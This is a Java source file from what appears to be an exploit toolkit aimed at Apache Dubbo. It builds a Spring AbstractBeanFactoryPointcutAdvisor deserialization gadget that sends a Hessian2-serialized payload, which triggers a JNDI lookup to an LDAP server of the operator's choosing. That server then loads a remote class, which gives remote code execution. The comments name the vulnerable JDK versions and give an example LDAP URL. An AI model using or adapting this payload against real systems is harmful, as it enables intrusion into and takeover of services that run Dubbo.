package com.threedr3am.exp.dubbo.payload.hessian;

import com.threedr3am.exp.dubbo.payload.Payload;
import com.threedr3am.exp.dubbo.utils.SpringUtil;
import org.springframework.beans.factory.BeanFactory;

/**
 * dubbo 默认配置，即hessian2反序列化，都可RCE
 *
 * todo 感谢 tcsecchen（https://github.com/tcsecchen）的研究并告之，经过修改makeBeanFactoryTriggerBFPA，达到spring通杀
 *
 * <dependency>
 *   <groupId>org.springframework</groupId>
 *   <artifactId>spring-aop</artifactId>
 *   <version>${spring.version}</version>
 * </dependency>
 *
 * @author threedr3am
 */
public class SpringAbstractBeanFactoryPointcutAdvisorPoc implements Payload {

  private String[] args;

  /**
   *
   * @param args
   *
   * arg[0]=ldap引用外部class地址，例：ldap://127.0.0.1:43658/Calc（ldap协议的JNDI服务可打jdk8u191及以下版本，大于jdk8u191需要使用gadget字节码）
   *
   * @return
   */
  @Override
  public Object getPayload(String[] args) {
    if (this.args != null)
      args = this.args;
    Object o = null;
    try {
      BeanFactory bf = SpringUtil.makeJNDITrigger(args[0]);
      o = SpringUtil.makeBeanFactoryTriggerBFPA(args[0], bf);
    } catch (Exception e) {
      e.printStackTrace();
    }
    return o;
  }

  @Override
  public void injectDefaultArgs(String[] args) {
    this.args = args;
  }

}
